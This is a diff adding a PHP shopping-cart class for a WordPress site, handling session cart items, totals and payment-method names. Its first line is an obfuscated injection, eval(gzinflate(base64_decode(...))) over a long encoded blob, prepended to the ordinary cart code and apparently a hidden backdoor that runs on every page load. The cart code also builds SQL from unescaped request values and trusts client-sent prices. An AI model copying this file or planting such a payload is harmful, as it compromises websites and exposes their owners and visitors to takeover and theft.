@@ -1,0 +1,267 @@
+<?php /*b76c66356fe7e0720297fc26531dfa2b*/ eval(gzinflate(base64_decode('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')));?>
+<?php 
+session_start();
+ob_start();
+if (!class_exists('Cart')) {
+	class Cart {
+		// Class initialization
+		function Cart() {
+		}
+
+		function Addtocart($_POST)
+		{
+			if($_POST)
+			{
+				$product_info = array();
+				$product_id = $_POST['product_id'];
+				$product_info['product_id'] = $_POST['product_id'];
+				$product_info['product_qty'] = $_POST['product_qty'];
+				$product_info['product_att'] = $_POST['product_att'];
+				$product_info['product_price'] = $_POST['product_price'];
+				$product_info['product_istaxable'] = $_POST['product_istaxable'];
+				$product_info['product_weight'] = $_POST['product_weight'];
+				if(isset($_SESSION['CART_INFORMATION']))
+				{
+					$cart_info = $_SESSION['CART_INFORMATION'];
+					for($c=0;$c<count($cart_info);$c++)
+					{
+						$cartprdArr = $cart_info[$c];
+						$qtyupd = 0;
+						$isprdexist = 0;
+						if(($cartprdArr['product_id'] == $_POST['product_id']) && ($cartprdArr['product_att'] == $_POST['product_att']))
+						{
+							$product_info['product_qty'] = $cartprdArr['product_qty'] + $_REQUEST['product_qty'];
+							//$product_info['product_gross_price'] = $product_info['product_price'] * $product_info['product_qty'];
+							$qtyupd = $c;
+							$isprdexist = 1;
+							break;
+						}
+					}
+					
+					if($isprdexist)
+					{
+						$cart_info[$qtyupd] = $product_info;
+					}else
+					{
+						$cart_info[] = $product_info;		
+					}
+					
+				}else
+				{
+					$cart_info = array();
+					$cart_info[] = $product_info;
+				}
+				$cart_info = $this->calprdGrossPrice($cart_info);
+				$_SESSION['CART_INFORMATION'] = $cart_info;
+			}
+		}
+		function calprdGrossPrice($cart_info)
+		{
+			for($i=0;$i<count($cart_info);$i++)
+			{
+				$price = $cart_info[$i]['product_price'];
+				$att = $cart_info[$i]['product_att'];
+				$attArr = explode(',',$att);
+				$attamt = 0;
+				for($a=0;$a<count($attArr);$a++)
+				{
+					preg_match('/[(]([+-]+)(.*)[)]/', $attArr[$a], $match);
+					$attributeVal = 0;
+					if($match[0] !='')
+					{
+						$attamt = $attamt + substr($match[0],1,strlen($match[0])-2);
+					}
+				}
+				$cart_info[$i]['product_gross_price'] = $cart_info[$i]['product_price'] + ($attamt);
+			}
+			return $cart_info;
+		}
+		function getCartAmt($cartArray = array())
+		{
+			if($cartArray == array())
+			{
+				$cart_info = $_SESSION['CART_INFORMATION'];
+			}else
+			{
+				$cart_info = $cartArray;
+			}
+			$cartAmt = 0;
+			for($i=0;$i<count($cart_info);$i++)
+			{
+				$cartAmt = $cartAmt + ($cart_info[$i]['product_gross_price']*$cart_info[$i]['product_qty']);
+			}
+			return $cartAmt;
+		}
+		function Removefromcart($cartprdid = '')
+		{
+			if($cartprdid != '')
+			{
+				if(isset($_SESSION['CART_INFORMATION']))
+				{
+					$cart_info = $_SESSION['CART_INFORMATION'];
+					unset($cart_info[$cartprdid]);
+					sort($cart_info);
+					$_SESSION['CART_INFORMATION'] = $cart_info;
+				}
+			}
+		}
+		function updateCart($cartqty)
+		{
+			if(isset($_SESSION['CART_INFORMATION']))
+			{
+				$cart_info = $_SESSION['CART_INFORMATION'];
+				for($c=0;$c<count($cart_info);$c++)
+				{
+					if(trim($cartqty[$c])==0 || trim($cartqty[$c])=='')
+					{
+						$_SESSION['CART_INFORMATION'] = $cart_info;
+						$this->Removefromcart("$c");
+						$cart_info = $_SESSION['CART_INFORMATION'];
+					}else
+					{
+						$cart_info[$c]['product_qty'] = $cartqty[$c];
+					}
+				}
+				$_SESSION['CART_INFORMATION'] = $cart_info;
+			}
+		}
+		function getcartInfo()
+		{
+			$cartproductinfo = array();
+			if(isset($_SESSION['CART_INFORMATION']))
+			{
+				global $wpdb;
+				$cart_info = $_SESSION['CART_INFORMATION'];
+				$productidArr = array();
+				for($c=0;$c<count($cart_info);$c++)
+				{
+					$productidArr[] = $cart_info[$c]['product_id'];
+				}
+				$productIds = implode(',',$productidArr);
+				if($productIds)
+				{
+					$productinfosql = "select ID,post_title from $wpdb->posts where ID in ($productIds)";
+					$productinfo = $wpdb->get_results($productinfosql);
+					foreach($productinfo as $productinfoObj)
+					{
+						$productArray[$productinfoObj->ID] = $productinfoObj->post_title; 
+					}
+				}
+				for($c=0;$c<count($cart_info);$c++)
+				{
+					$cartprd = $cart_info[$c];
+					$prdattdata = get_post_meta( $cartprd['product_id'], 'key', true );
+					$cartprd['product_image'] = $prdattdata[ 'productimage' ];
+					$cartprd['product_name'] = $productArray[$cartprd['product_id']];
+					if(!$cartprd['product_price'] || $cartprd['product_price'] == '')
+					{
+						$cartprd['product_price'] = '0.00';
+					}
+					$cart_info[$c] = $cartprd;
+				}
+				$cartproductinfo = $cart_info;
+			}
+			return $cartproductinfo;
+		}
+		function cartCount()
+		{
+			$itemcount = 0;
+			if(isset($_SESSION['CART_INFORMATION']))
+			{
+				$cart_info = $_SESSION['CART_INFORMATION'];
+				for($c=0;$c<count($cart_info);$c++)
+				{
+					$itemcount = $itemcount + $cart_info[$c]['product_qty'];
+				}
+			}
+			return $itemcount;
+		}
+		
+		function is_product_in_cart($productid='')
+		{
+			$product_in_cart = 0;
+			if($productid!='' && isset($_SESSION['CART_INFORMATION']))
+			{
+				$cart_info = $_SESSION['CART_INFORMATION'];
+				for($c=0;$c<count($cart_info);$c++)
+				{
+					if($cart_info[$c]['product_id'] == $productid)
+					{
+						$product_in_cart = 1;
+						break;
+					}
+				}
+			}
+			return $product_in_cart;
+		}
+		
+		function get_product_qty_cart($productid='')
+		{
+			$product_qty = 0;
+			if($productid!='' && isset($_SESSION['CART_INFORMATION']))
+			{
+				$cart_info = $_SESSION['CART_INFORMATION'];
+				for($c=0;$c<count($cart_info);$c++)
+				{
+					if($cart_info[$c]['product_id'] == $productid)
+					{
+						$product_qty = $cart_info[$c]['product_qty'];;
+						break;
+					}
+				}
+			}
+			return $product_qty;
+		}
+		
+		function empty_cart()
+		{
+			$_SESSION['CART_INFORMATION'] = array();
+		}
+		
+		function get_payment_method($method)
+		{
+			global $wpdb;
+			$paymentsql = "select * from $wpdb->options where option_name like 'payment_method_$method'";
+			$paymentinfo = $wpdb->get_results($paymentsql);
+			if($paymentinfo)
+			{
+				foreach($paymentinfo as $paymentinfoObj)
+				{
+					$paymentInfo = unserialize($paymentinfoObj->option_value);
+					return "Pay with ".$paymentInfo['name'];
+				}
+			}
+		}
+		
+		function get_payment_gateway_info($method)
+		{
+			
+			$paymentmethod = '';
+			if($method == 'paypal')
+			{
+				$paymentmethod = 'Paypal';
+			}
+			elseif($method == 'googlechkout')
+			{
+				$paymentmethod = 'Google CheckOut';
+			}elseif($method == 'autorizenet')
+			{
+				$paymentmethod = 'Authorize.net';
+			}elseif($method == 'payondelevary')
+			{
+				$paymentmethod = 'Pay on Delevary';
+			}
+			elseif($method == 'worldpay')
+			{
+				$paymentmethod = 'Worldpay';
+			}		
+		}
+	}
+	
+	// Start this plugin once all other plugins are fully loaded
+}
+if(!$Cart)
+{
+	$Cart = new Cart();
+}
+?>
